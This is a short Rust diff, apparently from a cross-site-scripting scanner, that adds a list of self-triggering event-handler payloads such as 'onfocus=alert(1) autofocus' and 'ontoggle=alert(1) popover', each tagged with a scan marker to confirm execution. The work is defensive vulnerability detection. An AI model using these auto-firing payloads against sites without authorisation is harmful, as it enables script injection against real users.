@@ -105,6 +105,28 @@ pub fn generate_dynamic_payloads(context: &InjectionContext) -> Vec<String> {
                     if url_like {
                         payloads.extend(protocol_payloads.iter().cloned());
                     }
+                    // Self-triggering event handlers carrying the scan's id
+                    // marker. Critical for the "attribute name slot"
+                    // position (`<div id='x' MARKER>`) — bare `onabort=…`
+                    // never fires on a static div, but `onfocus=alert(1)
+                    // autofocus tabindex=0` and `ontoggle=alert(1) popover`
+                    // make the element auto-focusable/auto-toggled so the
+                    // reflection promotes to V instead of stalling at R.
+                    // Listed BEFORE attr_payloads so the first marker-
+                    // carrying payload is also DOM-verifiable.
+                    let id_marker = crate::scanning::markers::id_marker();
+                    let autotrigger_events = [
+                        "onfocus=alert(1) autofocus",
+                        "onfocus=alert(1) autofocus tabindex=0",
+                        "ontoggle=alert(1) popover",
+                        "onbeforeinput=alert(1) contenteditable",
+                        "onsecuritypolicyviolation=alert(1)",
+                        "onformdata=alert(1)",
+                        "onslotchange=alert(1)",
+                    ];
+                    for ev in &autotrigger_events {
+                        payloads.push(format!("{} id={}", ev, id_marker));
+                    }
                     payloads.extend(html_payloads);
                     payloads.extend(attr_payloads);
                     if !url_like {
